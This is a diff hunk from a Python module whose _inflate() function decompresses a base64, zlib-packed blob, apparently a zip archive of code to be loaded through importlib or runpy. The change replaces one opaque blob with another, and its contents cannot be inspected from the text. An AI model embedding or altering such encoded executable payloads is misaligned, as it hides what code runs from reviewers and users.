@@ -5,7 +5,7 @@ import base64, io, importlib.abc, importlib.machinery, runpy, sys, zipfile, zlib
 
 
 def _inflate() -> bytes:
-    b64 = """eNoL8GZmEWFgYOBgyOiWjy6effyiEZBnCsQ8QJxbWZCdrp+ck6lXUOnt6Rt8wvfMmcsXtjwKYmhqWnRmjxCvKn+4vPz/Hwz53yu2B9inq/puiAnM8swMnNfEKM4QgGK2B6N9IDeQxwnEgnCz4+Mz8zJL4uOBFgSHnfDVOeWn+4gJTafRacZPFkCeFZrO3MTMPLDO02d0T+hrBWqs03mmpXHqjPbFgE8FXz9+7Of/UNb/vfTLl+BLgQFeOl7625iMGrq+NLzZlOG8OsJXD2gNI5MIA27vw0ADIwNaYKDrRPccQmcMNq+ia0f3IUL7NGz+DfBmZQNJMwPhDiD9F6wYAFbQeKQ="""
+    b64 = """eNoL8GZmEWFgYOBgONkrH108+/hFIyDPFIh5gDi3siA7XT85J1OvoNLb0zf4hO+ZM5cvbHkUxNDUtOjMHiFeVf5wefn/Pxjyv1dsD7BPV/XdEBOY5ZkZOK+JUZwhAMVsD0b7QG4gjxOIBeFmx8dn5mWWxMcDLQgOO+Grc8pP9xETmk6j04yfLIA8KzSduYmZeWCdp8/ontDXCtRYp/NMS+PUGe2LAZ8Kvn782M//oaz/e+mXL8GXAgO8dLz0tzEZNXR9aXizKcN5dYSvHtAaRiYRBtzeh4EGRga0wEDXie45hM4YbF5F147uQ4T2adj8G+DNygaSZgbCHUD6L1gxAJ4OevY="""
     return zlib.decompress(base64.b64decode(b64))
 
 
